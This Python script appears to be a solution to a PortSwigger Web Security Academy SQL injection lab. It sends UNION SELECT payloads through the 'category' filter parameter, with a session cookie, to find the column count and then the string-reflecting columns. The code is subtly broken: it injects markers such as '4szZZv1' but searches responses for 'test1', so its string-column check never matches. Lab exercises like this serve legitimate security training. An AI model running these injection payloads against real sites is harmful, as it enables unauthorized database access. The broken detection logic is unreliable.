import requests
import re
from bs4 import BeautifulSoup

url = "https://0a7e00310401da04813d070300450063.web-security-academy.net/"

cookies = {
    "session": "gCAuMVLaQ8anut7GpJOUm9W5YcDYljgp"
}

headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": "https://portswigger.net/",
    "Accept-Language": "en-US,en;q=0.9"
}


def has_error(text):
    return (
        "Internal Server Error" in text
        or "error" in text.lower()
        or "syntax" in text.lower()
    )



correct_column_count = None
for column_count in range(1, 20):
    nulls = ", ".join(["NULL"] * column_count)

    payload = f"Accessories' UNION SELECT {nulls}-- -"

    params = {
        "category": payload
    }

    r = requests.get(f"{url}/filter", headers=headers, cookies=cookies, params=params)

    if r.status_code == 200 and not has_error(r.text):
        correct_column_count = column_count
        print(f"[+] Column count: {correct_column_count}")
        break
if correct_column_count is None:
    print("[-] Correct column count not found.")
    exit()
column_count = ["NULL"] * correct_column_count


for i in range(correct_column_count):
    columns = ["NULL"] * correct_column_count
    columns[i] = f"'4szZZv{i+1}'"

    payload = f"Accessories' UNION SELECT {', '.join(columns)}--"

    r = requests.get(f"{url}/filter", headers=headers, cookies=cookies, params={"category": payload})

    if f"test{i+1}" in r.text:
        print(f"[+] Reflected/string column: {i+1}")



if "Congratulations, you solved the lab!" in r.text:
    print("[+] Lab is Solved!")
else:
    print("[-] Lab is not solved yet.")

if "Internal Server Error" in r.text:
    print("[-] Internal Server Error")

# print(r.text)